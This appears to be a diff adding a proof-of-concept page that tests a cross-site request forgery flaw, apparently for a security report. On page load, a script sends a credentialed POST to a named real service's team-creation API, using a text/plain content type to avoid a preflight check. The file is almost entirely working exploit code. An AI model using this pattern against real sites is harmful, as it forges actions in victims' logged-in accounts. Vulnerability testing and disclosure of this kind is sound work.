@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>H-AK7 CSRF test</title>
+</head>
+<body>
+<h1>H-AK7 CSRF test</h1>
+<p id="status">Running test...</p>
+<pre id="result">Waiting for the request to finish.</pre>
+<script>
+(async function () {
+  var statusEl = document.getElementById('status');
+  var resultEl = document.getElementById('result');
+  try {
+    var res = await fetch('https://app.aikido.dev/api/teams', {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'text/plain' },
+      body: JSON.stringify({ name: 'H-AK7 Test Team', users: [] })
+    });
+    var text = await res.text();
+    statusEl.textContent = 'Done. HTTP status: ' + res.status;
+    resultEl.textContent = 'Status: ' + res.status + '\nBody: ' + text;
+  } catch (e) {
+    statusEl.textContent = 'Request failed: ' + e.message;
+    resultEl.textContent = 'Error: ' + e.message;
+  }
+})();
+</script>
+</body>
+</html>
